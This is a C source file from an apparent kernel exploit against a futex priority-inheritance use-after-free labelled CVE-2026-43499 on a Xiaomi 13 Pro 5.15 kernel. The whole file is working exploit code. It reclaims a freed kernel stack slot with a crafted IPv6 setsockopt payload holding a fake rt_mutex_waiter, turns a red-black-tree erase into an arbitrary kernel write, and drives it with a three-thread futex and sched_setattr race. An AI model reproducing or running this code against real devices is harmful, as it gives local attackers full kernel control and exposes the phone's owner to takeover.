/*
 * mcast_route.c — Phase 3: IPv6 optname-46 kernel-STACK reclaim of fake nodes.
 *
 * The 5.15 write primitive (CVE-2026-43499) needs the freed futex PI waiter's
 * stack slot reclaimed by user-controlled data.  Disassembly of
 * `do_ipv6_setsockopt` (optname 46 == 0x2e) on the Xiaomi 13 Pro 5.15 kernel:
 *
 *   optname 46 handler @ +0x153c99c:
 *     memset(sp+0x40, 0, 0x108)
 *     copy_from_user(sp+0x40, optval, 0x108)   <- 264 bytes onto KERNEL STACK
 *
 * so `setsockopt(AF_INET6, IPPROTO_IPV6=41, optname=46, payload, 264)` copies
 * 264 bytes onto do_ipv6_setsockopt's frame at [sp+0x40] (frame 0x2c0 deep),
 * reusing the freed waiter slot when the waiter thread calls it right after
 * FUTEX_WAIT_REQUEUE_PI unwinds the futex frames.
 *
 * The kernel validates the buffer as a multicast source filter:
 *   u16 @ payload+0x08 == 0xa (AF_INET6), u16 @ payload+0x88 == 0xa
 * and parses group/source addresses.  The unchecked bytes at payload+0xa8 are
 * a fake `struct rt_mutex_waiter` (BOTH tree_entry@0x0 and pi_tree_entry@0x18
 * are rb_nodes on 5.15, NOT plist_node):
 *
 *   rt_mutex_waiter { rb_node tree_entry@0x0; rb_node pi_tree_entry@0x18;
 *                     task@0x30; lock@0x38; wake_state@0x40; ... }
 *   rb_node { rb_parent_color@0x0; rb_right@0x8; rb_left@0x10 }
 *
 * remove_waiter() calls __rb_erase_augmented (0xa5c25c) on the waiter's
 * tree_entry.  In the "right child empty" case (rb_right==0) it does:
 *     [node->rb_left] = node->rb_parent_color      (@0xa5c2e0)
 * i.e. `[target] = value` when we set rb_left=target, rb_parent_color=value.
 * (If value is a small constant like 1, parent==0 and the follow-up relink is
 * skipped, so only the useful write fires.)
 */

#include "common.h"
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define MCAST_OPTNAME 46       /* IPV6_* optname handled by do_ipv6_setsockopt */
#define MCAST_PAYLOAD_LEN 0x108 /* 264 bytes copied onto the kernel stack */
#define MCAST_BLOB_OFF 0xa8    /* fake rt_mutex_waiter inside the payload */

/* FAKE_LOCK_OFF and SCRATCH_OFF are shared via common.h.  fake_lock is the
 * reference's static kernel data object: data_addr(_text)+0x2D65BD8
 * (spi_map_buf+0xc8).  SCRATCH is data_addr(_text)+0x2D92E38
 * (macsec_upd_rxsc+0x168), the value written by the erase primitive.  NOTE
 * the 0x2000000 _text->phys delta is already included in these offsets. */

/* Reclaim the freed PI waiter slot on the kernel STACK by issuing
 * setsockopt(AF_INET6, IPPROTO_IPV6, 46, payload, 264).  `fd` is the waiter
 * thread's AF_INET6 DGRAM socket.  Builds the multicast source-filter struct
 * (validated by the kernel) and drops a fake rt_mutex_waiter whose rb_node
 * fields drive the __rb_erase_augmented write `[rb_left] = rb_parent_color`,
 * i.e. `[target] = value`.  Returns 0 on success, -1 on failure. */
static int mcast_stack_reclaim(int fd, uint64_t value, uint64_t target,
                               uintptr_t task) {
  uint8_t payload[MCAST_PAYLOAD_LEN];
  memset(payload, 0, sizeof(payload));

  int iface = (int)if_nametoindex("lo");
  if (iface <= 0) iface = 1;

  /* Multicast source-filter struct validated by the optname 46 handler:
   * family==AF_INET6 at +0x08 and +0x88. */
  memcpy(payload + 0x00, &iface, sizeof(iface));
  *(uint16_t *)(payload + 0x08) = AF_INET6;
  struct in6_addr group, source;
  inet_pton(AF_INET6, "ff02::1", &group);   /* scoped multicast group */
  inet_pton(AF_INET6, "::1", &source);      /* source address */
  memcpy(payload + 0x10, &group, sizeof(group));
  memcpy(payload + 0x20, &iface, sizeof(iface));
  *(uint16_t *)(payload + 0x88) = AF_INET6;
  memcpy(payload + 0x90, &source, sizeof(source));

  /* Fake rt_mutex_waiter at payload+0xa8.  BTF layout (5.15):
   *   tree_entry(rb_node)@0x0  pi_tree_entry(rb_node)@0x18  task@0x30
   *   lock@0x38  wake_state@0x40
   * remove_waiter() rb_erases the PI-waiters tree entry, tree_entry at +0x0
   * (verified against the reference so's build_mcast_payload: the fake rb_node
   * is placed at tree_entry@0x0, NOT pi_tree_entry@0x18).  __rb_erase_augmented
   * on tree_entry walks the "right child empty" case (rb_right==0, rb_left!=0):
   *   tmp = node->rb_left
   *   [tmp] = node->rb_parent_color        (@ __rb_erase_augmented)
   * i.e. `[rb_left] = rb_parent_color` = `[target] = value` when we set
   * rb_left = target (write address) and rb_parent_color = value.  rb_right
   * must be 0 to select this branch.  plant the rb_node at tree_entry@0x0:
   *   tree_entry.rb_parent_color(+0x0) = value
   *   tree_entry.rb_right      (+0x8) = 0
   *   tree_entry.rb_left       (+0x10) = target
   * posirion pi_tree_entry@0x18..0x28 stays 0 (not erased). */
  uint8_t *w = payload + MCAST_BLOB_OFF;
  memset(w, 0, 0x58);
  memcpy(w + 0x00, &value, sizeof(value));   /* tree_entry.rb_parent_color = value */
  memcpy(w + 0x10, &target, sizeof(target)); /* tree_entry.rb_left = write target */
  /* w + 0x08 = rb_right = 0 selects the right-child-empty erase case */
  /* waiter.task MUST be a valid task_struct: remove_waiter() dereferences
   * waiter->task->pi_lock.  Use the static init_task address. */
  memcpy(w + 0x30, &task, sizeof(task));
  uint64_t fake_lock = data_addr(KIMAGE_TEXT_BASE) + MCAST_FAKE_LOCK_OFF;
  memcpy(w + 0x38, &fake_lock, sizeof(fake_lock)); /* waiter.lock = static fake */
  uint64_t fake_ws = 0x8200000003ull;        /* waiter.wake_state (ref) */
  memcpy(w + 0x40, &fake_ws, sizeof(fake_ws));

  int ret = setsockopt(fd, IPPROTO_IPV6, MCAST_OPTNAME, payload,
                       MCAST_PAYLOAD_LEN);
  pr_info("mcast reclaim: fd=%d ret=%d errno=%d value=0x%016llx target=0x%016llx task=0x%016zx\n",
          fd, ret, errno, (unsigned long long)value,
          (unsigned long long)target, (size_t)task);
  return ret == 0 ? 0 : -1;
}

/* Kept for the do_one_write() call path; the real reclaim happens on the
 * waiter thread's socket.  Returns 1 (a single socket suffices). */
int mcast_spray_nodes(uint64_t value, uint64_t target, int count) {
  (void)value; (void)target; (void)count;
  return 1;
}

/* No heap objects are held by the stack-reclaim primitive, so teardown only
 * needs to close the waiter thread's socket; the waiter thread owns it and it
 * is closed on process exit.  Kept as a no-op for the main.c call path. */
void mcast_teardown(void) {}

/* =====================================================================
 * Phase 4: plist arbitrary-write route (three-thread timing).
 *
 * Mirrors the reference's 5.15 writer:
 *   waiter  : LOCK_PI f_pi_chain -> WAIT_REQUEUE_PI f_wait -> f_pi_target
 *             -> mcast spray (reclaim the freed PI waiter slot with a fake
 *             ipv6_mc_socklist whose addr = value|target) -> set m_consume
 *   owner   : LOCK_PI f_pi_target -> LOCK_PI f_pi_chain
 *   consumer: sched_setattr(waiter_tid, SCHED_BATCH/nice=19) -> the waiter's
 *             priority change re-walks the PI chain -> plist_del writes
 *             value (list.next) to target (list.prev) on the fake node.
 *   main    : FUTEX_CMP_REQUEUE_PI completes the requeue.
 * ===================================================================== */

static uint32_t m_f_pi_target;
static uint32_t m_f_pi_chain;
static uint32_t m_f_wait;
static atomic_int m_waiter_ready;
static atomic_int m_owner_started;
static atomic_int m_waiter_tid;
static atomic_int m_consume;
static atomic_int m_sched_ret;
static atomic_int m_sched_errno;
static atomic_int m_scheduled;
static uint64_t m_write_value;
static uint64_t m_write_target;
static uintptr_t m_waiter_task;

static void *mcast_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pr_info("mcast owner: lock PI target BEGIN\n");
  long lt = futex_op(&m_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("mcast owner: lock PI target done ret=%ld errno=%d\n", lt, errno);
  if (lt != 0) pr_error("mcast owner lock target errno=%d\n", errno);
  while (!atomic_load(&m_waiter_ready)) usleep(1000);
  pr_info("mcast owner: waiter ready, owner_started=1\n");
  atomic_store(&m_owner_started, 1);
  pr_info("mcast owner: lock PI chain BEGIN\n");
  futex_op(&m_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("mcast owner: lock PI chain done\n");
  for (;;) pause();
  return NULL;
}

static void *mcast_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int mytid = (int)syscall(SYS_gettid);
  atomic_store(&m_waiter_tid, mytid);
  /* The reference's 5.15 fake waiter uses init_task as waiter->task (its
   * target entry +0x30 = data_addr(_text)+off_init_task).  remove_waiter()
   * only takes waiter->task->pi_lock, so a static, always-valid task_struct
   * is sufficient and avoids any kprobe/perf leak under enforcing mode. */
  m_waiter_task = SLIDE_INIT_TASK;
  pr_info("mcast waiter: fake waiter task=init_task 0x%016zx\n",
          (size_t)m_waiter_task);
  pr_info("mcast waiter: lock PI chain BEGIN\n");
  futex_op(&m_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("mcast waiter: lock PI chain done\n");
  atomic_store(&m_waiter_ready, 1);
  while (!atomic_load(&m_owner_started)) usleep(1000);
  pr_info("mcast waiter: WAIT_REQUEUE_PI BEGIN\n");
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  futex_op(&m_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &m_f_pi_target, 0);
  pr_info("mcast waiter: WAIT_REQUEUE_PI returned, reclaim BEGIN\n");
  /* The reference's waiter thread re-sprays the fake waiter in a tight
   * setsockopt(46) loop so the freed PI-waiter stack slot stays filled with
   * fresh fake data when the consumer's sched_setattr triggers the write.
   * A single setsockopt pops its frame on return, so the fake node would be
   * overwritten before remove_waiter runs.  Loop until the consumer finishes. */
  /* Cover the freed PI-waiter stack slot with a first reclaim BEFORE the
   * consumer is allowed to fire.  The reference gates the consumer on the
   * waiter's first setsockopt(46) (flag [hdr+0x148] set right after the first
   * reclaim call); if the consumer's sched_setattr lands while the freed slot
   * is still unwritten, remove_waiter() dereferences garbage and panics. */
  atomic_store(&m_consume, 0);
  unsigned iterations = 0;
  while (!atomic_load(&m_scheduled)) {
    /* A fresh socket per reclaim: optname 46 joins a multicast group, and the
     * same fd cannot re-join the same group (EADDRNOTAVAIL).  A new socket
     * keeps every spray success so the freed PI-waiter stack slot stays filled
     * with fresh fake data when the consumer's sched_setattr triggers write. */
    int fd = (int)socket(AF_INET6, SOCK_DGRAM, 0);
    if (fd >= 0) {
      mcast_stack_reclaim(fd, m_write_value, m_write_target, m_waiter_task);
      close(fd);
    }
    /* Only after the first reclaim has plausibly landed do we let the consumer
     * sched_setattr trigger the PI-chain remove_waiter() write. */
    if (!atomic_load(&m_consume)) atomic_store(&m_consume, 1);
    iterations++;
    if ((iterations & 0x3ff) == 0)
      pr_info("mcast waiter: spray loop iter=%u scheduled=%d\n", iterations,
              atomic_load(&m_scheduled));
    /* brief yield to let the consumer's sched_setattr land on this thread */
    sched_yield();
  }
  pr_info("mcast waiter: consumer done after %u sprays\n", iterations);
  for (;;) pause();
  return NULL;
}

/* sched_setattr(waiter_tid, { size=48, policy=SCHED_BATCH(3), nice=19 }) */
struct mcast_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

static void *mcast_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  while (!atomic_load(&m_waiter_tid)) usleep(1000);
  while (!atomic_load(&m_consume)) usleep(1000);
  int tid = atomic_load(&m_waiter_tid);
  struct mcast_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(struct mcast_sched_attr);
  attr.sched_policy = 3; /* SCHED_BATCH */
  attr.sched_nice = 19;
  errno = 0;
  pr_info("mcast consumer: sched_setattr BEGIN tid=%d\n", tid);
  long r = (long)syscall(274 /* __NR_sched_setattr */, tid, &attr, 0);
  pr_info("mcast consumer: sched_setattr done ret=%ld errno=%d\n", r, errno);
  atomic_store(&m_sched_ret, (int)r);
  atomic_store(&m_sched_errno, errno);
  atomic_store(&m_scheduled, 1);
  for (;;) pause();
  return NULL;
}

/* One arbitrary write: store `value` to `*target` via the 5.15 plist
 * primitive.  Returns 0 on the route completing, -1 on setup failure. */
int mcast_plist_write(uint64_t target, uint64_t value, int attempts) {
  m_write_target = target;
  m_write_value = value;
  m_f_pi_target = 0;
  m_f_pi_chain = 0;
  m_f_wait = 0;
  atomic_store(&m_waiter_ready, 0);
  atomic_store(&m_owner_started, 0);
  atomic_store(&m_waiter_tid, 0);
  atomic_store(&m_consume, 0);
  atomic_store(&m_sched_ret, 0);
  atomic_store(&m_sched_errno, 0);
  atomic_store(&m_scheduled, 0);

  pthread_t wt, ot, ct;
  if (pthread_create(&wt, NULL, mcast_waiter_thread, NULL) != 0 ||
      pthread_create(&ot, NULL, mcast_owner_thread, NULL) != 0 ||
      pthread_create(&ct, NULL, mcast_consumer_thread, NULL) != 0) {
    pr_warning("mcast route pthread_create failed\n");
    return -1;
  }
  while (!atomic_load(&m_waiter_ready) || !atomic_load(&m_owner_started))
    usleep(1000);
  usleep(50000);
  pr_info("mcast plist: waiter+owner ready, CMP_REQUEUE_PI BEGIN\n");
  /* Complete the requeue; the consumer's sched_setattr then fires the write. */
  errno = 0;
  futex_op(&m_f_wait, FUTEX_CMP_REQUEUE_PI, 1, NULL, &m_f_pi_target, 0);
  pr_info("mcast plist: CMP_REQUEUE_PI done\n");

  int deadline_ms = 3000;
  while (deadline_ms > 0 && !atomic_load(&m_scheduled)) {
    usleep(10000);
    deadline_ms -= 10;
  }
  pr_info("mcast plist: sched wait over scheduled=%d\n",
          atomic_load(&m_scheduled));
  int ret = atomic_load(&m_sched_ret);
  int err = atomic_load(&m_sched_errno);
  pr_info("mcast plist write target=0x%016llx value=0x%016llx "
          "sched_ret=%d errno=%d\n",
          (unsigned long long)target, (unsigned long long)value, ret, err);
  (void)attempts;
  return ret;
}